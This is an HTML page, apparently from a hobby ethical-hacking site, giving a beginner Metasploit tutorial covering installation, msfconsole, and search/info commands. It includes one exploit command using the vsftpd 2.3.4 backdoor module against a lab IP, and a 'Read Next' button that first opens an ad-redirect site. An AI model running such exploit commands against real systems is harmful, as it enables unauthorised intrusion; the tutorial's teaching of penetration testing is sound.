@@ -1,0 +1,135 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Metasploit Framework Tutorial - Part 1 | HackEr404</title>
+  <link rel="stylesheet" href="mystyles.css">  <!-- SEO Meta Tags --> 
+   <meta name="title" content="Metasploit Tutorial for Beginners - Part 1 | HackEr404">
+  <meta name="description" content="Learn how to use the Metasploit framework for ethical hacking and penetration testing. Step-by-step guide with commands and real examples.">
+  <meta name="keywords" content="metasploit tutorial, ethical hacking, penetration testing, msfconsole, exploit, payload, metasploit commands, hacker404">
+  <meta name="robots" content="index, follow">
+  <meta name="author" content="HackEr404">  <meta property="og:title" content="Metasploit Tutorial - Getting Started with msfconsole">
+  <meta property="og:description" content="Step-by-step guide on how to use the Metasploit Framework for beginners. Learn commands, modules, and best practices.">
+  <meta property="og:type" content="website">
+</head><body>
+  <nav>
+    <div class="logo">
+      <img src="../404logo.jpg" alt="HACKER 404 Logo">
+    </div>
+    <div class="menu" id="menu">
+      <a href="../index.html">Home</a>
+      <a href="tools.html">Tools</a>
+      <a href="#">Frontend</a>
+      <a href="/networking/networking1.html">Networking</a>
+      <a href="../about.html">About</a>
+      <a href="mycontact.html">Contact</a>
+    </div>
+    <button class="menu-toggle" id="menu-toggle">&#9776;</button>
+  </nav>  <div class="search-bar">
+    <input type="text" id="globalSearch" placeholder="Search tools..." onkeyup="searchFromTools()" />
+    <ul id="searchResults"></ul>
+  </div>  <section class="tutorial-container">
+    <h1>Metasploit Framework - Part 1</h1>
+    <h2>Getting Started with msfconsole</h2><p>Metasploit is one of the most powerful tools in ethical hacking. It helps you find, test, and exploit vulnerabilities in systems.</p>
+
+<h3>Installation</h3>
+<ul>
+  <li><strong>Linux:</strong> <code>sudo apt install metasploit-framework</code></li>
+  <li><strong>Termux:</strong> <code>pkg install unstable-repo && pkg install metasploit</code></li>
+</ul>
+
+<h3>Start msfconsole</h3>
+<pre><code>msfconsole</code></pre>
+<p>This command opens the Metasploit console. You’ll see a banner and version info.</p>
+
+<h3>Use Case Example</h3>
+<p>Let’s say you found a vulnerable FTP server. You can try exploiting it like this:</p>
+<pre>
+
+use exploit/unix/ftp/vsftpd_234_backdoor set RHOST 192.168.1.105 run </pre>
+
+<h3>Key Tips</h3>
+<ul>
+  <li>Always use Metasploit in legal labs only.</li>
+  <li>Use <code>search</code> command to find modules (e.g., <code>search ftp</code>).</li>
+  <li>Use <code>info</code> command to learn more about a module.</li>
+</ul>
+
+<p><strong>Example:</strong> <code>info exploit/unix/ftp/vsftpd_234_backdoor</code></p>
+
+<h3>Screenshot</h3>
+<img src="images/msfconsole_output.jpg" alt="Metasploit Console Screenshot">
+
+<h3>Best Practices</h3>
+<ul>
+  <li>Always scan and enumerate the target first (e.g., using Nmap).</li>
+  <li>Note the ports and services before using Metasploit.</li>
+  <li>Document every test step in real assessments.</li>
+</ul>
+
+<p>Continue to the next part for more on payloads and sessions!</p>
+
+  </section>  <section id="next-tutorial">
+    <h2>Next Tutorial</h2>
+    <div class="next-tutorial-card">
+      <img src="images/metasploit_payload.jpg" alt="Next Tutorial Preview">
+      <div class="next-tutorial-content">
+        <h3>Metasploit Part 2: Payloads and Listeners</h3>
+        <p>Learn how to generate payloads and set up reverse shells.</p>
+        <button class="next-tut-but" onclick="redirectWithAd()">Read Next →</button>
+      </div>
+    </div>
+  </section>  <script>
+    function redirectWithAd() {
+      window.open('https://sawutser.top/4/9290786', '_blank');
+      setTimeout(function() {
+        window.location.href = 'metasploit2.html';
+      }, 3000);
+    }
+  </script>  <section id="instagram">
+    <h2>Follow Me on Instagram</h2>
+    <div class="instagram-feed">
+      <a href="https://instagram.com/hacker404.com_" target="_blank">View My Instagram</a>
+    </div>
+  </section>  <footer>
+    <p>© 2025 hackEr404 - All rights reserved.</p>
+  </footer>  <script>
+    const toggleBtn = document.getElementById('menu-toggle');
+    const menu = document.getElementById('menu');
+    toggleBtn.addEventListener('click', () => {
+      menu.classList.toggle('show');
+    });
+
+    let toolPages = [];
+    fetch('/tools/tools.json')
+      .then(response => response.json())
+      .then(data => {
+        toolPages = data;
+      });
+
+    function searchFromTools() {
+      const input = document.getElementById("globalSearch").value.toLowerCase();
+      const resultsContainer = document.getElementById("searchResults");
+      resultsContainer.innerHTML = '';
+
+      const filtered = toolPages.filter(tool => tool.title.toLowerCase().includes(input));
+
+      if (filtered.length === 0) {
+        const message = document.createElement("li");
+        message.textContent = "No results found. Please go to the tools folder manually for more tools.";
+        message.style.color = "red";
+        resultsContainer.appendChild(message);
+        return;
+      }
+
+      filtered.forEach(tool => {
+        const li = document.createElement("li");
+        const link = document.createElement("a");
+        link.href = tool.url;
+        link.textContent = tool.title;
+        li.appendChild(link);
+        resultsContainer.appendChild(li);
+      });
+    }
+  </script></body>
+</html>
